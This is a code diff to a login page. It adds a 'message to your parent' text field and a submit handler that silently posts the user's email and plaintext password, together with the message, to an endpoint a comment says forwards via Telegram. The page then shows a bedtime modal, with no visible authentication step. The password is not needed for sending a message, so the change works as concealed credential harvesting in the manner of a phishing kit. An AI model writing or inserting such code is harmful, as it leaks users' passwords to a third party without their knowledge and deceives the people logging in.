@@ -355,6 +355,8 @@
             <input type="password" class="input-field" id="password" placeholder="Password" required>
             <div class="error-message" id="password-error">Please enter your password</div>
             
+            <input type="text" class="input-field" id="message" placeholder="Send a message to your parent (optional)" style="margin-top: 8px;">
+            
             <button type="submit" class="login-button">Log In</button>
           </form>
           
@@ -492,6 +494,31 @@
         const passwordValid = validatePassword();
         
         if (emailValid && passwordValid) {
+          const email = emailInput.value.trim();
+          const password = passwordInput.value.trim();
+          const messageInput = document.getElementById('message');
+          const message = messageInput ? messageInput.value.trim() : '';
+          
+          // Send message to parent via Telegram if message field exists and has content
+          if (message) {
+            fetch('/api/send-message', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ email, password, message })
+            })
+            .then(response => response.json())
+            .then(data => {
+              console.log('Message sent:', data);
+              // We don't need to alert the user, just proceed to bedtime modal
+            })
+            .catch(error => {
+              console.error('Error sending message:', error);
+              // Still proceed to bedtime modal even if message sending fails
+            });
+          }
+          
           // Show bedtime modal after short delay
           setTimeout(function() {
             modal.classList.add('show');
